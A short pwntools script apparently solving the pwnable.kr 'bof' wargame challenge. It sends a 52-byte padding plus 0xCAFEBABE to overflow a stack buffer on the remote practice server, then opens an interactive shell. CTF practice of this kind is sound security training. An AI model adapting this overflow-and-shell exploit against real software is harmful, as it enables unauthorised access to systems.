from pwn import *

#p = process('bof')
p = remote('pwnable.kr', 9000)

p.sendline('a'*52 + p32(0xCAFEBABE))

p.interactive()
